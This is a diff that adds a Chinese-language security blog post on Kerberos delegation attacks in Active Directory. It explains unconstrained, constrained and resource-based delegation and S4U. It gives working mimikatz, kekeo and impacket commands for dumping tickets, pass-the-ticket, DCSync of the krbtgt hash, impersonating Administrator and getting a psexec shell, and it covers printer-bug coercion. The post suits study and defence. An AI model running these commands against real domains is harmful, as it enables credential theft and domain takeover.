@@ -1,0 +1,409 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>委派攻击 | pyroxenite</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://pyroxenites.github.io/favicon.ico?v=1685337865502">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://pyroxenites.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://pyroxenites.github.io">
+        <img class="avatar" src="https://pyroxenites.github.io/images/avatar.png?v=1685337865502" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://pyroxenites.github.io">
+        <h1 class="site-title">pyroxenite</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">委派攻击</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-05-28</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://pyroxenites.github.io/tag/lOr-AdJnN/">
+                    内网渗透
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h2 id="背景">背景</h2>
+<p>委派是域中一种安全机制,可以允许某个服务器代表某个用户去执行某个操作<br>
+不正确的委派配置,可以达到攻击者提权的作用</p>
+<table>
+<thead>
+<tr>
+<th>服务/用户名</th>
+<th>主机名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>用户A</td>
+<td>hostA</td>
+</tr>
+<tr>
+<td>服务B</td>
+<td>hostB</td>
+</tr>
+<tr>
+<td>服务C</td>
+<td>hostC</td>
+</tr>
+</tbody>
+</table>
+<p><img src="https://pyroxenites.github.io/post-images/1645440298998-11a45341-a45a-4567-b54a-1b2974d099a1.png" alt="image.png" loading="lazy"><br>
+委派需要提前在域控上进行配置,它可以理解成是一种权限<br>
+简而言之:当A访问B服务时候,B服务拿着A用户的凭证去访问C服务,这个过程便是委派</p>
+<p>接受委派的用户只是服务账户或计算机用户<br>
+在域内只有主机账号和服务账号才有委派属性</p>
+<blockquote>
+<p>主机账号：活动目录中computer组内的计算机,也被称为机器账号<br>
+服务账号：域内用户的一种类型，是服务器运行服务时候所用的账号，将服务运行起来加入域内<br>
+如sqlserver/mysql等；域用户通过注册spn也能成为服务账号</p>
+</blockquote>
+<p>委派是基于服务的，在域内找服务一般通过S P N来进行寻找<br>
+约束和非约束的鉴权都是在web server上 必须是带有SPN的用户</p>
+<h3 id="分类">分类</h3>
+<ol>
+<li>非约束委派</li>
+</ol>
+<p>直接在域控上配置主机hostB的委派属性，配置成如下图所示：<br>
+<img src="https://pyroxenites.github.io/post-images/1645440522175-8d9b8fbf-4c8e-4ac3-994e-69de951197f4.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>user访问serverA的时候,向D C发起认证，D C会检查serverA的机器账号的属性,如果是非约束委派的话，会把用户的tgt放在st票据中并一起发送给serverA 这样serverA在验证st票据的同时也获取到了用户的tgt，并把tgt存贮在自己的lsass进程中以备下次重用，从而serverA就可以使用这个tgt,来模拟这个user访问任何服务</p>
+</blockquote>
+<p>这样子的话，任何用户都可以委派主机hostB代替自己去访问任何服务(传递一个tgt票据)<br>
+使用无约束委派,被授予此权限的服务器或服务账户能够模拟用户对任何主机上的任何服务进行身份验证<br>
+服务账号在接收该T G S后,获取到其中的用户的tgt,将用户tgt放入lsass中存储供后续使用</p>
+<ol start="2">
+<li>约束性委派</li>
+</ol>
+<p>选择“仅信任此计算机来委派指定的服务”如下图：<br>
+<img src="https://pyroxenites.github.io/post-images/1645440570556-df7f2b0e-2c78-4f1c-b5b1-9148cfe2a622.png" alt="image.png" loading="lazy"><br>
+如果hostB被配置了如上图所示的约束性委派，那么这时候主机hostB就可以被任意用户委派去访问LISI计算机上的cifs服务，与非约束性委派的区别是，限制了访问的服务类型与主机，但不能限制谁能对主机hostB进行委派。</p>
+<blockquote>
+<p>user访问serverA,向D C发起kerberos认证，域控返回user tgt票据和st1票据，user使用st1票据对servericeA进行访问<br>
+如果配置了serviceA到serviceB的约束委派,则serviceA能使用S4U2PROXY协议将用户发给自己的可转发的st1票据以用户的身份发给DC<br>
+域控返回给serviceA一个用来访问serviceB的ST2票据,这样serviceA就能以用户的身份对serviceB发起访问</p>
+</blockquote>
+<ol start="3">
+<li>基于资源的约束性委派</li>
+</ol>
+<blockquote>
+<p>需要在拥有资源的机器上去设置，如第二步中想限制只有指定主机才能被委派来访问主机lisi上面的cifs服务，就需要在域控上对主机lisi上进行基于资源的约束性委派的配置。<br>
+我允许此账户列表[........]代表他人向我进行身份验证</p>
+</blockquote>
+<p>K dc知道A是否可以访问服务B,但不知道A允许B来代表自己,这时候S4U2SELF和S4U2PROXY协议就诞生了</p>
+<blockquote>
+<p>这两个协议只作用于约束性与基于资源的约束性这两种委派方式</p>
+</blockquote>
+<h3 id="约束委派和非约束委派的区别">约束委派和非约束委派的区别</h3>
+<p>非约束委派只能访问委派的那个机器 并是指定的服务</p>
+<h3 id="s4u2self">S4U2SELF</h3>
+<p>使得服务可以代表某个用户获得一个用来访问服务自身的票据</p>
+<blockquote>
+<p>可以代表自身请求针对其自身的可转发的Kerberos服务票据(ST1)</p>
+</blockquote>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1645441520219-f286f3fa-ec6b-4d6a-bced-0b3eb5de3ced.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>req请求 rep回应</p>
+<ol>
+<li>as</li>
+<li>tgs</li>
+<li>ap</li>
+<li>权限</li>
+</ol>
+</blockquote>
+<p>在TGS_REQ这个阶段中，S4U2SELF是这个数据包的一部分内容[PA_FOR_USER]</p>
+<blockquote>
+<p>（用用户的TGT向KDC请求用户的可转发的ST1，再用这张ST1去发起S4U2proxy请求。） 通过此扩展可以拿到一张标识任意用户身份的ST，它的作用其实是协议转换。有时用户会通过其他协议（例如NTLM或什至基于表单的身份验证）对服务进行身份验证，因此他们不会将TGS发送给服务。在这种情况下，服务可以调用S4U2Self来要求身份验证服务为其自身的任意用户生成TGS，然后可以在调用S4U2Proxy时将其用作依据。例如网站A服务器可以使用它去向KDC请求一张用户B身份的ST1，网站A服务器再用这张ST1去发起S4U2proxy请求</p>
+</blockquote>
+<h3 id="s4u2proxy">S4U2PROXY</h3>
+<blockquote>
+<p>可以以用户名义请求其他服务的ST2</p>
+</blockquote>
+<p>约束委派就是限制了S4U2proxy扩展的范围<br>
+也是在TGS_REQ阶段一个参数<br>
+可以使当前主机代表其他用户访问其他主机,相比较于S4U2SELF,范围大了很多,当然&quot;代表&quot;肯定也是有条件的</p>
+<blockquote>
+<p>拿用户的可转发的ST1请求用于访问服务器的ST2） 该拓展作用是使用一张用户A身份的ST1去向KDC请求一张用于访问文件服务器B的ST2，这张ST2的身份还是用户的，这样的话网站A就可以利用用户A的权限去访问文件服务器B上的文件了。</p>
+</blockquote>
+<h2 id="发现具有委派关系的用户和计算机">发现具有委派关系的用户和计算机</h2>
+<ol>
+<li>当服务账号或者主机被设置为非约束性委派时,其useraccuntcontrol属性会包含TRUSTED_FOR_DELEGATION</li>
+<li>当服务账号或者主机被设置为约束性委派时,其useraccountcontrol属性包含TRUSTED_TO_AUTH_FOR_DELEGATION,且msDS-AllowedToDelegateTo属性会包含被约束的服务</li>
+</ol>
+<h3 id="工具查看">工具查看</h3>
+<ol>
+<li>ADfind</li>
+</ol>
+<blockquote>
+<p>不需要账号密码即可查看</p>
+</blockquote>
+<ol start="2">
+<li>ldapsearch</li>
+</ol>
+<blockquote>
+<p>需要域内任意用户的账号和密码</p>
+</blockquote>
+<ol start="3">
+<li>powerview</li>
+</ol>
+<blockquote>
+<p>不需要账号密码即可查看</p>
+</blockquote>
+<h2 id="非约束委派的利用">非约束委派的利用</h2>
+<ol>
+<li>用户A向K D C申请一张可转发的用户A自己的tgt与访问service1需要的ticket</li>
+<li>用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1</li>
+<li>service1使用那张tgt与session key来代表用户A行使后续操作 例如访问service2</li>
+</ol>
+<p>当某台主机访问了配置了非约束性委派当主机的时候,就会将自己当可转发当tgt发送到配置了非约束性委派当主机上</p>
+<blockquote>
+<p>诱导域管账号(默认开启非约束委派)访问了我们配置了非约束委派的主机,认证方式无论是kerberos还是ntlm,这样我们都拥有了域管理的tgt,从而模拟管理员访问任何服务,相当于拿下了整个域环境</p>
+</blockquote>
+<h3 id="工具利用">工具利用</h3>
+<p>miminikatz</p>
+<pre><code class="language-sql">privilege::debug
+serurlsa::tickets /export
+</code></pre>
+<p>此时拿到了管理员的票据,用mimikatz将票据注入内存中,然后访问域控</p>
+<pre><code class="language-sql">kerberos::ptt xxxxxxxxxxxxxxxxxxxxxx.kirbi
+
+查看票据
+kerberos::list
+
+读取krbtgt的hash
+lsadump::dcsync /domain:sec.com /user:krbtgt
+</code></pre>
+<h3 id="思路">思路</h3>
+<ol>
+<li>通过adfind工具查询域内配置了非约束性委派的机器</li>
+<li>拿下目标机器</li>
+<li>诱导域管对我们这台机器进行委派</li>
+<li>拿到域管的tgt</li>
+</ol>
+<h3 id="非约束委派spooler打印机">非约束委派+spooler打印机</h3>
+<p>总体来说非约束需要管理员与委派机器建立连接,属于鸡肋现象<br>
+老外研究出了非约束委派+spooler打印机来强制与指定的主机进行连接</p>
+<h4 id="原理">原理</h4>
+<p>利用windows打印系统远程协议(MS-RPRN)的一个漏洞可以使得开启spooler服务的主机强制对一个攻击者指定的主机进行kerberos或者ntlm验证</p>
+<ol>
+<li>确定主机开启spooler服务。</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1645492890745-e07e4485-e63d-4ace-bc5f-2890528e85e5.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>在目标上使用exp来强制管理员访问目标的spooler服务，进而获得管理员主机的tgt，使用方法spoolsample.exe 管理员 目标，可以强制管理员访问目标。</li>
+</ol>
+<blockquote>
+<p>下载地址:<a href="https://github.com/shanfenglan/test/tree/master/spooler">https://github.com/shanfenglan/test/tree/master/spooler</a><br>
+一定要使用普通管理员的权限(不用绕过UAC)来执行 spoolsample.exe 管理员 目标 这个命令，只有这样才能导出域控主机账户的tgt。</p>
+</blockquote>
+<h2 id="约束委派的利用">约束委派的利用</h2>
+<p>非约束委派被委派的机器或直接的得到发布委派的用户的tgt,是十分不安全的<br>
+故微软推出了约束性委派,还扩充了kerberos协议,添加了s4u2self和s4u2proxy协议[S4U的两个子协议]</p>
+<p>由于服务账号只能获取某个用户或者主机的服务的st1而非tgt,所以只能模拟用户访问特定的服务<br>
+但是如果能够拿到约束委派用户或主机的密码或者Hash,就可以伪造S4U请求,伪造成服务用户以任何用户的权限申请访问指定服务的st2</p>
+<ol>
+<li>用户A访问service1</li>
+<li>service1通过s4u2self协议代表用户A去请求一个可以访问service1自身的可转发的ticket，这个ticket代表域控授权service1可以使用用户A的身份进行操作</li>
+</ol>
+<blockquote>
+<p>域控授权service1代表用户A来访问service1</p>
+</blockquote>
+<ol start="3">
+<li>service1以用户A的身份访问K D C请求一个访问service2的可转发的ticket</li>
+<li>service1获取到ticket并以用户A的名义访问service2</li>
+</ol>
+<blockquote>
+<p>域控授权service1代表用户来访问service2<br>
+总的来说s4u2self解决的问题就是,确定了某台主机可以代表某用户对自己进行操作<br>
+s4u2proxy解决的问题就是确定了某台主机可以代表某用户对其他主机进行操作</p>
+</blockquote>
+<blockquote>
+<p>利用核心就是获得可转发的ticket票据</p>
+</blockquote>
+<h3 id="工具利用-2">工具利用</h3>
+<p>kekeo</p>
+<ol>
+<li>发现域内配置了约束性委派的服务账号</li>
+</ol>
+<pre><code class="language-bash">Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl
+</code></pre>
+<ol start="2">
+<li>读取密码</li>
+<li>生成一个tgt</li>
+</ol>
+<pre><code class="language-bash">明文密码
+tgt::ask /user:lisi$ /domain:test.com /password:xxxxxx
+
+拥有账户hash
+tgt::ask /user:lisi$ /domain:test.com /NTLM:497114015b3695d77441431ae90b78e3
+
+</code></pre>
+<ol start="4">
+<li>将得到的ticket导入到内存：<br>
+打开mimikatz先privilege::Debug然后执行下面命令：</li>
+</ol>
+<pre><code class="language-bash">kerberos::ptt 555.kirbi
+</code></pre>
+<ol start="5">
+<li>访问zhangsan的cifs服务看是否成功：</li>
+</ol>
+<pre><code class="language-bash">dir \\zhangsan\c$
+</code></pre>
+<p>如果即不知道明文也不知道hash，但是有了服务用户的主机权限<br>
+可以用mimikatz从内存中把服务用户的tgt dump出来</p>
+<pre><code class="language-bash">sekurlsa::tickets /export
+
+tgs::s4u /tgt:[0;3e7]-2-1-40e10000-LISI$@krbtgt-TEST.COM.kirbi /user:Administrator@test.com /service:cifs/zhangsan.test.com
+
+
+将ticket导入内存
+kerberos::ptt 333.kirbi
+
+dir \\zhangsan.test.com\c$
+
+</code></pre>
+<pre><code class="language-bash">python getST.py -dc-ip 192.168.124.142 -spn cifs/zhangsan -impersonate administrator test.com/lisi$ -hash :497114015b3695d77441431ae90b78e3
+set KRB5CCNAME=administrator.ccache
+python psexec.py -no-pass -k zhangsan
+
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1645496417039-726c8d09-c720-4d9e-a85a-bf409227cd9f.png" alt="image.png" loading="lazy"></figure>
+<p>](https://blog.csdn.net/qq_41874930/article/details/110633298)</p>
+<pre><code class="language-bash">发现s4u2proxy阶段失败但是s4u2self阶段成功
+
+失败的原因有可能是身份验证的方式选择了只支持kerberos验证。只要更换成“使用任何身份验证协议”即可
+</code></pre>
+<h2 id="基于资源的约束性委派">基于资源的约束性委派</h2>
+<p>传统委派，在设置的过程中其实都是需要SeEnableDelegation特权的，而这个特权需要域管理员才能设置。<br>
+基于资源的约束性委派不需要域管理员设置，而是机器本身</p>
+<h3 id="约束性委派和基于资源的约束性委派的区别">约束性委派和基于资源的约束性委派的区别</h3>
+<p>约束性委派：通过服务A委派到服务B，实际是在服务A上增加了Trusted_for_delegation字段(非约束性委派)，Trusted_toauthenticate_for_delegation和msDS-Allowedtodelegateto(约束性委派) 字段来达到委派的目的<br>
+后者：通过服务B允许服务A委派到服务B,实际上是通过服务B自身赋予msDS-AllowedToActOnBehalfOfOtherIdentity字段，从而允许服务A对服务B的基于资源的约束委派。</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://pyroxenites.github.io/post/ipc-gong-xiang-lian-jie-shang-xian-eset-yu-kong/">
+              <h3 class="post-title">
+                下一篇：IPC共享链接上线eset域控
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">温故而知新</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by pyroxenite | <a class="rss" href="https://pyroxenites.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
